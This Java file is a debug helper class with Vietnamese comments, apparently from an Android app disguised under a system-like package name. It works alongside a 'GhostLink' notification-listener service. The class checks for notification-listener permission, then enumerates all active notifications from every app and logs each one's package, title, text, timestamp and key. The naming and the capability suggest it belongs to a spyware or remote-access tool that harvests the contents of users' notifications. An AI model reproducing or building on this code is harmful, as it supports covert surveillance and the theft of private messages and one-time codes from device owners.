package com.android.background.services.helpers;

import android.app.Notification;
import android.content.Context;
import android.os.Build;
import android.service.notification.StatusBarNotification;
import android.util.Log;

import com.android.background.services.MainService;
import com.android.background.services.GhostLinkNotificationListenerService;

import java.util.List;

/**
 * Debug class để kiểm tra notifications
 */
public class NotificationsDebug {
    
    private static final String TAG = "NotificationsDebug";
    
    /**
     * Debug tất cả thông tin về notifications
     */
    public static void debugAllNotifications() {
        try {
            Log.d(TAG, "=== DEBUG NOTIFICATIONS START ===");
            
            // Kiểm tra quyền
            boolean hasPermission = NotificationPermissionHelper.isNotificationServiceEnabled();
            Log.d(TAG, "Notification permission: " + (hasPermission ? "GRANTED" : "DENIED"));
            
            // Kiểm tra service
            boolean serviceRunning = GhostLinkNotificationListenerService.isServiceRunning();
            Log.d(TAG, "NotificationListenerService running: " + serviceRunning);
            
            // Lấy notifications từ NotificationsManager
            Log.d(TAG, "Getting notifications from NotificationsManager...");
            Object result = NotificationsManager.getNotifications();
            if (result != null) {
                Log.d(TAG, "NotificationsManager result: " + result.toString());
            } else {
                Log.w(TAG, "NotificationsManager returned null");
            }
            
            // Debug trực tiếp từ NotificationManager
            debugDirectNotificationManager();
            
            // Debug từ NotificationListenerService
            debugNotificationListenerService();
            
            Log.d(TAG, "=== DEBUG NOTIFICATIONS END ===");
            
        } catch (Exception e) {
            Log.e(TAG, "Error in debugAllNotifications: " + e.getMessage());
            e.printStackTrace();
        }
    }
    
    /**
     * Debug trực tiếp từ NotificationManager
     */
    private static void debugDirectNotificationManager() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                Context context = MainService.getContextOfApplication();
                if (context != null) {
                    android.app.NotificationManager notificationManager = 
                        (android.app.NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);
                    
                    if (notificationManager != null) {
                        StatusBarNotification[] notifications = notificationManager.getActiveNotifications();
                        Log.d(TAG, "Direct NotificationManager - Active notifications count: " + 
                              (notifications != null ? notifications.length : 0));
                        
                        if (notifications != null) {
                            for (int i = 0; i < notifications.length; i++) {
                                StatusBarNotification sbn = notifications[i];
                                Notification n = sbn.getNotification();
                                Log.d(TAG, "Notification " + i + ":");
                                Log.d(TAG, "  Package: " + sbn.getPackageName());
                                Log.d(TAG, "  Title: " + (n.extras != null ? n.extras.getString(Notification.EXTRA_TITLE) : "null"));
                                Log.d(TAG, "  Text: " + (n.extras != null ? n.extras.getString(Notification.EXTRA_TEXT) : "null"));
                                Log.d(TAG, "  Post time: " + sbn.getPostTime());
                                Log.d(TAG, "  Key: " + sbn.getKey());
                            }
                        }
                    } else {
                        Log.w(TAG, "NotificationManager is null");
                    }
                } else {
                    Log.w(TAG, "Context is null");
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error in debugDirectNotificationManager: " + e.getMessage());
            e.printStackTrace();
        }
    }
    
    /**
     * Debug từ NotificationListenerService
     */
    private static void debugNotificationListenerService() {
        try {
            if (GhostLinkNotificationListenerService.isServiceRunning()) {
                GhostLinkNotificationListenerService service = GhostLinkNotificationListenerService.getInstance();
                if (service != null) {
                    List<StatusBarNotification> notifications = service.getAllActiveNotifications();
                    Log.d(TAG, "NotificationListenerService - Active notifications count: " + 
                          (notifications != null ? notifications.size() : 0));
                    
                    if (notifications != null) {
                        for (int i = 0; i < notifications.size(); i++) {
                            StatusBarNotification sbn = notifications.get(i);
                            Notification n = sbn.getNotification();
                            Log.d(TAG, "NLS Notification " + i + ":");
                            Log.d(TAG, "  Package: " + sbn.getPackageName());
                            Log.d(TAG, "  Title: " + (n.extras != null ? n.extras.getString(Notification.EXTRA_TITLE) : "null"));
                            Log.d(TAG, "  Text: " + (n.extras != null ? n.extras.getString(Notification.EXTRA_TEXT) : "null"));
                            Log.d(TAG, "  Post time: " + sbn.getPostTime());
                            Log.d(TAG, "  Key: " + sbn.getKey());
                        }
                    }
                } else {
                    Log.w(TAG, "NotificationListenerService instance is null");
                }
            } else {
                Log.w(TAG, "NotificationListenerService is not running");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error in debugNotificationListenerService: " + e.getMessage());
            e.printStackTrace();
        }
    }
}
